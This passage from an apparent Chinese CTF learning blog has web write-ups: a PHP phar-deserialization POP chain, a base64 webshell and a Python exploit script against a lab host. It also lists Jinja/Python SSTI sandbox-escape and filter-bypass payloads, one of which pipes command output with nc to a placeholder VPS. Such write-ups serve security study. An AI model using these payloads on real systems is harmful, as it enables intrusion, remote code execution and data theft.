punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>做题时的第一反应是反序列化类的题目，但是后来看到file.php的源码，又以为是文件上传的题目，只能说大方向完全错了。<br>后来知道是phar，先构造poc链。</p><pre class=" language-1"><code class="language-1">__set():方法的作用是为私有成员属性设置值，这个方法同样不用手动调用，是在设置私有属性值得时候自动调用的。__destruct():在到某个对象的所有引⽤都被删除或者当对象被显式销毁时执⾏__call():着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。__get():当我们试图获取一个不可达属性时(比如private)，类会自动调用__get函数</code></pre><p>Test:__destruct-&gt;Upload:__toString-&gt;Show:__get-&gt;Show:__call-&gt;Show:__backdoor<br>以前没有遇到魔术方法后带参数的写法，__get方法中的$name为调用的不可达属性，__call方法中的$name为调用的方法名，$arguments为传递的参数。<br>先写好poc链，然后加上phar部分。</p><pre class=" language-php"><code class="language-php">@<span class="token function">unlink</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>phar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件,随便新建一个文件内容随意</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>生成phar的payload。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#Test:\_\_destruct->Upload:\_\_toString->Show:\_\_get->Show:\_\_call->Show:\_\_backdoor</span><span class="token keyword">class</span> <span class="token class-name">Upload</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$fsize</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Show</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$upload</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$show</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fname</span><span class="token operator">=</span><span class="token variable">$show</span><span class="token punctuation">;</span><span class="token variable">$upload</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">fsize</span><span class="token operator">=</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-decode/resource=upload/c48a7cac24b5bffc0ec31197d6e29f74.png";</span><span class="token variable">$test</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$upload</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">unlink</span><span class="token punctuation">(</span>shell<span class="token punctuation">.</span>phar<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"shell.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//后缀名必须为phar</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$test</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义的meta-data存入manifest</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件,随便新建一个文件内容随意</span><span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>正则可以利用gzip绕过，接下来想办法利用file_get_contents()。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'class.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$show</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>调用了show函数</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http|https|file:|php:|gopher|dict|\.\./i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'illegal fname :P'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$src</span> <span class="token operator">=</span> <span class="token string">"data:jpg;base64,"</span><span class="token punctuation">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;img src={$src} />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>其中有file_get_contents()，可以在查询时输入<code>phar://</code>来利用，然后考虑include的利用。可以尝试直接访问一个图片马，但有正则check，用base64加密绕过正则。最后伪协议<code>php://filter</code>读取图片马。<br>图片马内容</p><pre class=" language-1"><code class="language-1">PD9waHAKc3lzdGVtKCdscyAvJyk7CnN5c3RlbSgnY2F0IC8qJyk7</code></pre><p>最后的exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gzip<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token keyword">import</span> requestsuploadurl<span class="token operator">=</span><span class="token string">'http://e180f625-0411-4402-8f2c-fd9d4aa3f806.node4.buuoj.cn:81/upload.php'</span>includeurl<span class="token operator">=</span><span class="token string">"http://e180f625-0411-4402-8f2c-fd9d4aa3f806.node4.buuoj.cn:81/file.php"</span><span class="token keyword">def</span> <span class="token function">compress</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> open<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f1<span class="token punctuation">:</span>        content<span class="token operator">=</span>f1<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#print(content)</span>        f<span class="token operator">=</span>gzip<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"shell.png"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    fname<span class="token operator">=</span>md5<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">".png"</span>    fpath<span class="token operator">=</span><span class="token string">"upload/"</span><span class="token operator">+</span>fname    data<span class="token operator">=</span><span class="token string">"phar://"</span><span class="token operator">+</span>fpath    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>includeurl<span class="token operator">+</span><span class="token string">"?f="</span><span class="token operator">+</span>data<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    compress<span class="token punctuation">(</span>r<span class="token string">"F:\phpStudy\phpstudy_pro\WWW\20220724\shell.phar"</span><span class="token punctuation">)</span>    files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span>r<span class="token string">"F:\code\py\20220725DASCTF\base.png"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>uploadurl<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r=requests.get(url="http://e180f625-0411-4402-8f2c-fd9d4aa3f806.node4.buuoj.cn:81/upload/c48a7cac24b5bffc0ec31197d6e29f74.png")</span>    <span class="token comment" spellcheck="true">#print(r.text)</span>    files<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span> open<span class="token punctuation">(</span>r<span class="token string">'F:\code\py\20220725DASCTF\shell.png'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>uploadurl<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(r.text)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span><span class="token string">"shell.png"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".png"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span><span class="token string">"base.png"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".png"</span><span class="token punctuation">)</span>    phar<span class="token punctuation">(</span><span class="token string">"shell.png"</span><span class="token punctuation">)</span></code></pre><p>注意上传的文件的存放路径为/upload/MD5(filename).png。<br><img src="https://kingofkb.github.io/medias/image/20220725/end.png"><br>得到flag:DASCTF{715b0a38-d4a7-443a-bebe-c2bde351a72a}</p><h2 id="harddisk"><a href="#harddisk" class="headerlink" title="harddisk"></a>harddisk</h2><h3 id="SSTI如何发掘可利用payload"><a href="#SSTI如何发掘可利用payload" class="headerlink" title="SSTI如何发掘可利用payload"></a>SSTI如何发掘可利用payload</h3><h4 id="关于SSTI"><a href="#关于SSTI" class="headerlink" title="关于SSTI"></a>关于SSTI</h4><p>这方面主要看<a href="https://www.anquanke.com/post/id/188172#h2-11">SSTI沙盒逃逸详细总结 </a><br>最初接触SSTI的时候总会有一个固定思维，遇到了题就去搜SSTI的payload，然后一个个去套，随缘写题法（×）。这种做法导致我直到现在都对SSTI没有很深的理解。<br>python环境下常用的命令执行方式：</p><pre class=" language-1"><code class="language-1">os.system()os.popen()subprocess:    subprocess.call    subprocess.popen</code></pre><p>然而每个题都是有自己独特的一个考点的并且python环境不同，所能够使用的类也有差异，如果不能把握整体的原理，就不能根据具体题目来进行解题了。这里我们来初探一下发掘步骤。<br>比如我们想要一个执行命令的payload，如何查找？很简单我们只需要有os模块执行os.system即可</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#python2</span>num <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'os'</span> <span class="token keyword">in</span> item<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">:</span>            <span class="token keyword">print</span> num<span class="token punctuation">,</span>item        num<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        num<span class="token operator">+=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#72 &lt;class 'site._Printer'></span><span class="token comment" spellcheck="true">#77 &lt;class 'site.Quitter'></span></code></pre><p>payload</p><pre class=" language-payload"><code class="language-payload">''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('ls')[].__class__.__base__.__subclasses__()[72].__init__.__globals__['os'].popen('ls').read()</code></pre><p>查阅资料发现访问os模块还有从warnings.catchwarnings模块入手的，而这两个模块分别位于元组中的59，60号元素。__init__方法用于将对象实例化，在这个函数下我们可以通过funcglobals（或者<code>\_\_globals</code>）看该模块下有哪些globals函数（注意返回的是字典），而linecache可用于读取任意一个文件的某一行，而这个函数引用了os模块。</p><pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__.values()[12].system('ls')</code></pre><p>python3和python2原理都是一样的，只不过环境变化有点大，比如python2下有file而在python3下已经没有了，所以是直接用open。查阅了相关资料发现对于python3的利用主要索引在于__builtins__，找到了它我们就可以利用其中的eval、open等等来执行我们想要的操作。这里改编了一个递归脚本（能力有限，并不够完善..）</p><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>属于无回显类型题目<a href="https://www.anquanke.com/post/id/188172#h2-12">无回显处理</a></p><pre class=" language-payload"><code class="language-payload">nc转发    vps：nc -lvp 44444    payload: ''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('ls | nc xx.xxx.xx.xx 44444')</code></pre><p>打开环境<br><img src="https://kingofkb.github.io/medias/image/20220725/try.png"><br>发现输入什么都会在页面显示，应该是SSTI注入，过滤的符号与内容较多。<br>{ { } }被ban掉，我们可以将{  {  } }换成{ % % }来绕过。<br>由于还过滤了像 ]、_、request 这类常用的字符和关键字，我们可以用 attr() 配合 unicode 编码的方法绕过。</p><pre class=" language-1"><code class="language-1">{ %if(""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"))% }success{ %endif% }    # { %if("".__class__)% }success{ %endif% }</code></pre><p>在里面的内容拼接成功后，会回显success，可通过这个方法来验证是否拼接成功。<br>然后就可以开始寻找我们要利用的函数了，尝试寻找os没有找到，这里把payload贴一下，不知道为什么。</p><pre class=" language-payload"><code class="language-payload">"".__class__.__mro__[1].__subclasses__[].__init__.__globals__["os"]"".__class__.__mro__.__getitem__(1).__subclasses__.__getitem__(i).__init__.__globals__.__getitem__("os")""|attr("__class__")|attr("__mro__")|attr("__getitem__")(1)|attr("__subclasses__")|attr("__getitem__")()|attr("__init__")|attr("__globals__")|attr("__getitem__")("os")""|attr(\"\\u005F\\u005F\\u0063\\u006C\\u0061\\u0073\\u0073\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u006D\\u0072\\u006F\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006D\\u005F\\u005F\")(1)|attr(\"\\u005F\\u005F\\u0073\\u0075\\u0062\\u0063\\u006C\\u0061\\u0073\\u0073\\u0065\\u0073\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006D\\u005F\\u005F\")("+str(i)+")|attr(\"\\u005F\\u005F\\u0069\\u006E\\u0069\\u0074\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006D\\u005F\\u005F\")(\"\\u006F\\u0073\")payload=u"{ %if(\"\"|attr(\"\\u005F\\u005F\\u0063\\u006C\\u0061\\u0073\\u0073\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u006D\\u0072\\u006F\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006D\\u005F\\u005F\")(1)|attr(\"\\u005F\\u005F\\u0073\\u0075\\u0062\\u0063\\u006C\\u0061\\u0073\\u0073\\u0065\\u0073\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006D\\u005F\\u005F\")("+str(i)+")|attr(\"\\u005F\\u005F\\u0069\\u006E\\u0069\\u0074\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u006C\\u006F\\u0062\\u0061\\u006C\\u0073\\u005F\\u005F\")|attr(\"\\u005F\\u005F\\u0067\\u0065\\u0074\\u0069\\u0074\\u0065\\u006D\\u005F\\u005F\")(\"\\u006F\\u0073\")))% }success{ %endif% }"</code></pre><p>看WP发现要找popen，结果上面的payload同样找不到popen，要换payload。<br>WP中用的是这种类型的payload</p><pre><code>{ %if("".__class__.__bases__[0].__subclasses__()[遍历].__init__.__globals__["popen"])% }success{ %endif% }{ %if(""|attr("__class__")|attr("__bases__")|attr("__getitem__")(0)|attr("__subclasses__")()|attr("__getitem__")(遍历)|attr("__init__")|attr("__globals__")|attr("__getitem__")("popen"))% }success{ %endif% }{ %if(""|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f")|attr("\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(0)|attr("\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f")()|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")(遍历)|attr("\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f")|attr("\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f")|attr("\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f")("\u0070\u006f\u0070\u0065\u006e"))% }success{ %endif% }</code></pre><p>跑出第133个子类有popen方法。<br>最后利用vps外带即可获得flag（复现的时候用和WP几乎一模一样的payload但是会被waf，还不清楚到底为什么）</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf SSTI phar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022强网杯web 部分题目学习</title>
      <link href="/2022/08/11/2022%E5%BC%BA%E7%BD%91%E6%9D%AFweb%20%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/08/11/2022%E5%BC%BA%E7%BD%91%E6%9D%AFweb%20%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="2022强网杯web-部分题目学习"><a href="#2022强网杯web-部分题目学习" class="headerlink" title="2022强网杯web 部分题目学习"></a>2022强网杯web 部分题目学习</h1><p>好久没有发博客了，最近同时开了好几个坑，都还没有写完，电脑还坏了，拖了一段时间，先看看qwb的web，感觉很有水平，没有找到环境，所以只是看着WP回忆了回忆。</p><h2 id="RceFile"><a href="#RceFile" class="headerlink" title="RceFile"></a>RceFile</h2><p><code>www.zip</code>获取源码<br>upload.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.inc.php"</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">"error"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">102400</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$typeArr</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$imgType</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$typeArr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span> <span class="token string">"image"</span> <span class="token operator">|</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$typeArr</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imgType</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$blackext</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"php"</span><span class="token punctuation">,</span> <span class="token string">"php5"</span><span class="token punctuation">,</span> <span class="token string">"php3"</span><span class="token punctuation">,</span> <span class="token string">"html"</span><span class="token punctuation">,</span> <span class="token string">"swf"</span><span class="token punctuation">,</span> <span class="token string">"htm"</span><span class="token punctuation">,</span><span class="token string">"phtml"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$filearray</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token variable">$filearray</span><span class="token punctuation">[</span><span class="token string">"extension"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span> <span class="token variable">$blackext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"extension error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$imgname</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"./"</span><span class="token punctuation">.</span><span class="token variable">$imgname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$userfile</span><span class="token punctuation">,</span> <span class="token variable">$imgname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">"userfile"</span><span class="token punctuation">,</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$userfile</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token operator">*</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token string">"file: {$imgname}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">"upload failed!"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token 